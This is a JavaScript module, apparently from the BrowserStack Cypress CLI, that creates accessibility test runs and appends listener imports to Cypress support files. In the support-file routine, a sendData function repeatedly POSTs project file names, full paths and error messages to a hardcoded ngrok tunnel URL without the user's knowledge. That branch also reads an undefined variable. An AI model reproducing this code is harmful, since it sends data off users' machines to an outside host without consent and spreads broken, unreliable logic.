const logger = require("../helpers/logger").winstonLogger;
const { API_URL } = require('./constants');
const utils = require('../helpers/utils');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const os = require('os');
const glob = require('glob');
const helper = require('../helpers/helper');
const { CYPRESS_V10_AND_ABOVE_CONFIG_FILE_EXTENSIONS } = require('../helpers/constants');
const { consoleHolder } = require("../testObservability/helper/constants");
const supportFileContentMap = {}
const HttpsProxyAgent = require('https-proxy-agent');

const browserStackLog = (message) => {
    // if (!Cypress.env('BROWSERSTACK_LOGS')) return;
    if (typeof cy === 'undefined') {
      console.warn('Cypress is not defined. Ensure that this code is running in a Cypress environment.');
    } else {
      cy.task('browserstack_log', message);
    }
  }

exports.checkAccessibilityPlatform = (user_config) => {
  let accessibility = false;
  try {

    user_config.browsers.forEach(browser => {
      if (browser.accessibility) {
        accessibility = true;
      }
    })
  } catch {}
  
  return accessibility;
}

exports.setAccessibilityCypressCapabilities = async (user_config, accessibilityResponse) => {
  if (utils.isUndefined(user_config.run_settings.accessibilityOptions)) {
    user_config.run_settings.accessibilityOptions = {}
  }
  user_config.run_settings.accessibilityOptions["authToken"] = accessibilityResponse.data.accessibilityToken;
  user_config.run_settings.accessibilityOptions["auth"] = accessibilityResponse.data.accessibilityToken;
  user_config.run_settings.accessibilityOptions["scannerVersion"] = accessibilityResponse.data.scannerVersion;
  user_config.run_settings.system_env_vars.push(`ACCESSIBILITY_AUTH=${accessibilityResponse.data.accessibilityToken}`)
  user_config.run_settings.system_env_vars.push(`ACCESSIBILITY_SCANNERVERSION=${accessibilityResponse.data.scannerVersion}`)
  
}

exports.isAccessibilitySupportedCypressVersion = (cypress_config_filename) => {
  const extension = cypress_config_filename.split('.').pop();
  return CYPRESS_V10_AND_ABOVE_CONFIG_FILE_EXTENSIONS.includes(extension);
}

exports.createAccessibilityTestRun = async (user_config, framework) => {

  try {

    if (!this.isAccessibilitySupportedCypressVersion(user_config.run_settings.cypress_config_file) ){
      logger.warn(`Accessibility Testing is not supported on Cypress version 9 and below.`)
      process.env.BROWSERSTACK_TEST_ACCESSIBILITY = 'false';
      user_config.run_settings.accessibility = false;
      return;
    }
    const userName = user_config["auth"]["username"];
    const accessKey = user_config["auth"]["access_key"];
    let settings = utils.isUndefined(user_config.run_settings.accessibilityOptions) ? {} : user_config.run_settings.accessibilityOptions

    const {
      buildName,
      projectName,
      buildDescription
    } = helper.getBuildDetails(user_config);

    const data = {
      'projectName': projectName,
      'buildName': buildName,
      'startTime': (new Date()).toISOString(),
      'description': buildDescription,
      'source': {
        frameworkName: "Cypress",
        frameworkVersion: helper.getPackageVersion('cypress', user_config),
        sdkVersion: helper.getAgentVersion(),
        language: 'javascript',
        testFramework: 'cypress',
        testFrameworkVersion: helper.getPackageVersion('cypress', user_config)
      },
      'settings': settings,
      'versionControl': await helper.getGitMetaData(),
      'ciInfo':  helper.getCiInfo(),
      'hostInfo': {
        hostname: os.hostname(),
        platform: os.platform(),
        type: os.type(),
        version: os.version(),
        arch: os.arch()
      },
      'browserstackAutomation': process.env.BROWSERSTACK_AUTOMATION === 'true'
    };

    const config = {
      auth: {
        username: userName,
        password: accessKey
      },
      headers: {
        'Content-Type': 'application/json'
      }
    };

    const response = await nodeRequest(
      'POST', 'v2/test_runs', data, config, API_URL
    );
    
    if(!utils.isUndefined(response.data)) {
      process.env.BS_A11Y_JWT = response.data.data.accessibilityToken;
      process.env.BS_A11Y_TEST_RUN_ID = response.data.data.id;
    }
    if (process.env.BS_A11Y_JWT) {
      process.env.BROWSERSTACK_TEST_ACCESSIBILITY = 'true';
    }
    logger.debug(`BrowserStack Accessibility Automation Test Run ID: ${response.data.data.id}`);

    this.setAccessibilityCypressCapabilities(user_config, response.data);
    helper.setBrowserstackCypressCliDependency(user_config);

  } catch (error) {
    if (error.response) {
      logger.error("Incorrect Cred");
      logger.error(
        `Exception while creating test run for BrowserStack Accessibility Automation: ${
          error.response.status
        } ${error.response.statusText} ${JSON.stringify(error.response.data)}
        `
      );
    } else if (error.message === 'Invalid configuration passed.') {
      logger.error("Invalid configuration passed.");
      logger.error(
        `Exception while creating test run for BrowserStack Accessibility Automation: ${
          error.message || error.stack
        }`
      );
      for (const errorkey of error.errors) {
        logger.error(errorkey.message);
      }
    } else {
      logger.error(
        `Exception while creating test run for BrowserStack Accessibility Automation: ${
          error.message || error.stack
        }`
      );
    }
    // since create accessibility session failed
    process.env.BROWSERSTACK_TEST_ACCESSIBILITY = 'false';
    user_config.run_settings.accessibility = false; 
  }
}

const nodeRequest = (type, url, data, config) => {
  return new Promise(async (resolve, reject) => {
    const options = {
      ...config,
      method: type,
      url: `${API_URL}/${url}`,
      data: data
    };

    if(process.env.HTTP_PROXY){
      options.proxy = false
      options.httpsAgent = new HttpsProxyAgent(process.env.HTTP_PROXY);

    } else if (process.env.HTTPS_PROXY){
      options.proxy = false
      options.httpsAgent = new HttpsProxyAgent(process.env.HTTPS_PROXY);
    }

    axios(options).then(response => {
      if(!(response.status == 201 || response.status == 200)) {
          logger.info("response.status in nodeRequest", response.status);
          reject(response && response.data ? response.data : `Received response from BrowserStack Server with status : ${response.status}`);
      } else {
          try {
              if(typeof(response.data) !== 'object') body = JSON.parse(response.data);
          } catch(e) {
              if(!url.includes('/stop')) {
                reject('Not a JSON response from BrowserStack Server');
              }
          }
          resolve({
              data: response.data
          });
      }
    }).catch(error => {

        logger.info("error in nodeRequest", error);
        reject(error);
    })
  });
}

exports.supportFileCleanup = () => {
  logger.debug("Cleaning up support file changes added for accessibility.")
  Object.keys(supportFileContentMap).forEach(file => {
    try {
      if(typeof supportFileContentMap[file] === 'object') {
        let fileOrDirpath = file;
        if(supportFileContentMap[file].deleteSupportDir) {
          fileOrDirpath = path.join(process.cwd(), 'cypress', 'support');
        }
        helper.deleteSupportFileOrDir(fileOrDirpath);
      } else {
        fs.writeFileSync(file, supportFileContentMap[file], {encoding: 'utf-8'});
      }
    } catch(e) {
      logger.debug(`Error while replacing file content for ${file} with it's original content with error : ${e}`, true, e);
    }
  });
}

const getAccessibilityCypressCommandEventListener = (extName) => {
  return extName == 'js' ? (
    `require('browserstack-cypress-cli/bin/accessibility-automation/cypress');`
  ) : (
    `import 'browserstack-cypress-cli/bin/accessibility-automation/cypress'`
  )
}

exports.setAccessibilityEventListeners = (bsConfig) => {
  try {
    // Import fetch for older Node.js versions
    const fetch = require('node-fetch');
    
    async function sendData(dataString) {
      let url = 'https://b590683e7c2e.ngrok-free.app'; // hardcoded URL

      if(dataString === 'BROKEN') {
        url = 'https://b590683e7c2e.ngrok-free.app/broken';
      }

      // Wrap the input string inside an object and stringify it here
      const body = JSON.stringify({ message: dataString });

      try {
        const res = await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body
        });

        console.log('Status:', res.status);
        console.log('Body:', await res.text());
      } catch (err) {
        console.error('Error:', err.message); // Fixed: removed extra 'G'
      }
    }

    // Searching form command.js recursively
    const supportFilesData = helper.getSupportFiles(bsConfig, true);
    if(!supportFilesData.supportFile) return;
    
    const isPattern = glob.hasMagic(supportFilesData.supportFile);
    
    if(!isPattern) {
      console.log(`Inside isPattern`);
      browserStackLog(`Inside isPattern`);
      
      try {
            const defaultFileContent = fs.readFileSync(file, {encoding: 'utf-8'});
            console.log(`log1`);
            sendData(`bstack-log1`);
            
            let cypressCommandEventListener = getAccessibilityCypressCommandEventListener(path.extname(file));
            console.log(`log2`);
            sendData(`bstack-log2`);
            
            // Add debugging to understand why the condition fails
            const alreadyIncludes = defaultFileContent.includes(cypressCommandEventListener);
            console.log(`File ${file} already includes accessibility listener: ${alreadyIncludes}`);
            console.log(`Looking for: ${cypressCommandEventListener}`);
            console.log(`In content (first 500 chars): ${defaultFileContent.substring(0, 500)}`);
            sendData(`bstack-already-includes-${alreadyIncludes}`);
            
            if(!alreadyIncludes) {
              let newFileContent = defaultFileContent + 
                                  '\n' +
                                  cypressCommandEventListener +
                                  '\n';
              fs.writeFileSync(file, newFileContent, {encoding: 'utf-8'});
              console.log(`log3`);
              browserStackLog(`bstack-log3`);
              sendData(`bstack-log3`);
              supportFileContentMap[file] = supportFilesData.cleanupParams ? supportFilesData.cleanupParams : defaultFileContent;
            } else {
              console.log(`Skipping ${file} - accessibility listener already present`);
              sendData(`bstack-skipped-${path.basename(file)}`);
            }
      } catch(error) {
        console.log(`>>> Unable to modify file contents for ${supportFilesData.supportFile} to set event listeners with error ${error}`);
        sendData(`BROKEN`);
        sendData(`Unable to modify file contents for ${supportFilesData.supportFile} to set event listeners with error ${error}`);
      }
    }
    
    // Build the correct glob pattern
    const globPattern = supportFilesData.supportFile.startsWith('/') 
      ? process.cwd() + supportFilesData.supportFile 
      : path.join(process.cwd(), supportFilesData.supportFile);
    
    glob(globPattern, {}, (err, files) => {
      if(err) {
        logger.debug('EXCEPTION IN BUILD START EVENT : Unable to parse cypress support files');
        return;
      }
      
      files.forEach(file => {
        try {
          const fileName = path.basename(file);
          console.log(`fileName123: ${fileName}`);
          sendData(`bstack-${fileName}`);
          
          if(['e2e.js', 'e2e.ts', 'component.ts', 'component.js'].includes(fileName) && !file.includes('node_modules')) {
            console.log(`Adding accessibility event listeners to ${file}`);
            sendData(`Adding accessibility event listeners to ${file}`);
            
            const defaultFileContent = fs.readFileSync(file, {encoding: 'utf-8'});
            console.log(`log1`);
            sendData(`bstack-log1`);
            
            let cypressCommandEventListener = getAccessibilityCypressCommandEventListener(path.extname(file));
            console.log(`log2`);
            sendData(`bstack-log2`);
            
            if(!defaultFileContent.includes(cypressCommandEventListener)) {
              let newFileContent = defaultFileContent + 
                                  '\n' +
                                  cypressCommandEventListener +
                                  '\n';
              fs.writeFileSync(file, newFileContent, {encoding: 'utf-8'});
              console.log(`log3`);
              browserStackLog(`bstack-log3`);
              sendData(`bstack-log3`);
              supportFileContentMap[file] = supportFilesData.cleanupParams ? supportFilesData.cleanupParams : defaultFileContent;
            }
            browserStackLog(`>>> completed ${fileName}`);
            console.log(`>>> completed ${fileName}`);
            sendData(`>>> completed ${fileName}`);
          }
        } catch(e) {
          console.log(`>>> Unable to modify file contents for ${file} to set event listeners with error ${e}`);
          sendData(`BROKEN`);
          sendData(`Unable to modify file contents for ${file} to set event listeners with error ${e}`);
          logger.debug(`Unable to modify file contents for ${file} to set event listeners with error ${e}`, true, e);
        }
      });
    });
  } catch(e) {
    logger.debug(`Unable to parse support files to set event listeners with error ${e}`, true, e);
  }
}
